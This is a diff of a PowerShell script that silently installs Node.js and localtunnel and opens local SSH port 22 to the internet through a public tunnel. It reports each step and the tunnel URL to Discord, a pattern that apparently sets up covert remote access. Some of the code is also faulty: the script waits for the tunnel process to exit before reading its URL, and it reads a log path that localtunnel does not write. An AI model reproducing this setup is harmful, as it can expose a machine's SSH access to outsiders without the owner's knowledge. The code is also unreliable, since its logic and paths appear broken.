@@ -64,21 +64,24 @@ try {
     $Port = 22
     Send-DiscordMessage "SSH Port: $Port"
 
-    # Install Localtunnel
-    Send-DiscordMessage "Installing Localtunnel..."
-    Invoke-WebRequest -Uri https://github.com/localtunnel/localtunnel/releases/download/v2.0.0-beta.15/localtunnel-2.0.0-beta.15-windows-x64.zip -OutFile "$env:TEMP\localtunnel.zip"
-    Expand-Archive "$env:TEMP\localtunnel.zip" -DestinationPath "$env:ProgramFiles"
-    Remove-Item "$env:TEMP\localtunnel.zip"
+    # Install Node.js and Localtunnel
+    Send-DiscordMessage "Installing Node.js (required for Localtunnel)..."
+    Invoke-WebRequest -Uri https://nodejs.org/dist/v16.16.0/node-v16.16.0-x64.msi -OutFile "$env:TEMP\nodejs.msi"
+    Start-Process msiexec.exe -ArgumentList "/i", "$env:TEMP\nodejs.msi", "/quiet", "/norestart" -Wait
+    Remove-Item "$env:TEMP\nodejs.msi"
+
+    Send-DiscordMessage "Installing Localtunnel via npm..."
+    npm install -g localtunnel
     Send-DiscordMessage "Localtunnel installed successfully."
 
     # Start Localtunnel tunnel for SSH
     Send-DiscordMessage "Setting up SSH tunnel using Localtunnel..."
-    $TunnelProcess = Start-Process -FilePath "$env:ProgramFiles\localtunnel-2.0.0-beta.15-windows-x64\localtunnel.exe" -ArgumentList "--port 22" -PassThru
+    $TunnelProcess = Start-Process -FilePath "lt" -ArgumentList "--port 22" -PassThru
     $TunnelProcess.WaitForExit()
 
     # Capture the public URL from Localtunnel
     Start-Sleep -Seconds 5  # Wait for Localtunnel to generate the URL
-    $TunnelURL = (Get-Content "$env:ProgramFiles\localtunnel-2.0.0-beta.15-windows-x64\localtunnel-stdout.log" -Tail 10) | Select-String -Pattern "your url is" | ForEach-Object { $_.Line.Split(" ")[4] }
+    $TunnelURL = (Get-Content "$env:AppData\npm\lt\stdout.log" -Tail 10) | Select-String -Pattern "your url is" | ForEach-Object { $_.Line.Split(" ")[4] }
     Send-DiscordMessage "SSH Tunnel setup complete. Tunnel URL: $TunnelURL"
 
     # Final message
